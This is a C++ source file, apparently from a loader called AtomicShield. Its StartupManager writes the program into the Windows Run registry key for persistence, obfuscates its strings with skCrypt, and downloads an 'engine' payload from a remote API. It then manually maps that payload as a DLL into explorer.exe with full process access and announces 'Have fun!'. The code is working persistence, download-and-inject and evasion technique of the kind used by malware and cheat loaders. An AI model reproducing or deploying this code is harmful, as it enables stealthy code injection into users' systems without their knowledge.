#include <iostream>
#include "StdInc.h">
#include <shlwapi.h>
#include <GUI/GUI.h>
#pragma comment(lib, "shlwapi.lib")

bool StartupManager::IsAppInRegistry(std::string& appName)
{
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, skCrypt("Software\\Microsoft\\Windows\\CurrentVersion\\Run").decrypt(), 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        DWORD dwType = 0;
        DWORD dwSize = MAX_PATH;
        WCHAR szValue[MAX_PATH] = {0};

        if (RegQueryValueEx(hKey, appName.c_str(), NULL, &dwType, (LPBYTE)szValue, &dwSize) == ERROR_SUCCESS)
        {
            RegCloseKey(hKey);
            return true;
        }

        RegCloseKey(hKey);
    }
    return false;
}

bool StartupManager::AddAppToRegistry(std::string& appName)
{
    HKEY        hKey;
    std::string appPath = skCrypt("\"").decrypt();

    char szPath[MAX_PATH];
    if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0)
    {
        return false;
    }

    appPath += szPath;
    appPath += skCrypt("\" --startup").decrypt();

    if (RegOpenKeyEx(HKEY_CURRENT_USER, skCrypt("Software\\Microsoft\\Windows\\CurrentVersion\\Run").decrypt(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
    {
        if (RegSetValueEx(hKey, appName.c_str(), 0, REG_SZ, (const BYTE*)appPath.c_str(), (appPath.length() + 1) * sizeof(wchar_t)) == ERROR_SUCCESS)
        {
            RegCloseKey(hKey);
            return true;
        }
        RegCloseKey(hKey);
    }
    return false;
}

bool StartupManager::RemoveAppFromRegistry(std::string& appName)
{
    HKEY hKey;

    if (RegOpenKeyEx(HKEY_CURRENT_USER, skCrypt("Software\\Microsoft\\Windows\\CurrentVersion\\Run").decrypt(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
    {
        // Try to delete the value
        LONG result = RegDeleteValue(hKey, appName.c_str());
        RegCloseKey(hKey);

        // Return true if deleted successfully or if the value didn't exist
        return (result == ERROR_SUCCESS || result == ERROR_FILE_NOT_FOUND);
    }

    return false;
}

std::string StartupManager::GetCurrentProcessName()
{
    char szPath[MAX_PATH];
    if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0)
    {
        SharedUtil::AddDebugLog(skCrypt("[AtomicShield] Error retrieving executable path"));
        return "";
    }
    std::string fileName = PathFindFileName(szPath);
    return fileName;
}

void StartupManager::StartupFunction()
{
    static bool        bDownloading = false;
    static std::string strEngineBuffer;
    static bool        bInjected = false;
    static char        szLoadingMessage[144];
    static SUserData   DownloadData{};


    std::thread AgentPEBDownloader(
        [&]()
        {
            g_pAtomicAPI->DownloadEngine(&strEngineBuffer, &DownloadData);
            bDownloading = false;
        });

    AgentPEBDownloader.detach();
    bDownloading = true;

    while (bDownloading || strEngineBuffer.empty())
    {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    while (!bInjected)            
    {
        int iProcessID = SharedUtil::GetProcessID("explorer.exe");

        if (iProcessID > 0)
        {
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, iProcessID);
            if (hProcess)
            {
          
                bool bResult = ManualMapDll(hProcess, reinterpret_cast<BYTE*>((char*)strEngineBuffer.c_str()), strEngineBuffer.size());
                if (bResult)
                {
                    MessageBoxA(NULL, skCrypt("[AtomicShield] Have fun!"), skCrypt("Success"), MB_OK);
                    __fastfail(0);
                    bInjected = true;
                }
                else
                {
                    MessageBoxA(NULL, skCrypt("[AtomicShield] An error occurred while loading!"), skCrypt("Failed"), MB_ICONERROR);
                }
                CloseHandle(hProcess);
            }
            else
            {
                SharedUtil::AddDebugLog(skCrypt("[AtomicShield] Failed to get process handle!\n"));
            }
        }
        else
        {
            std::this_thread::sleep_for(std::chrono::seconds(10));            
        }
    }
    
}
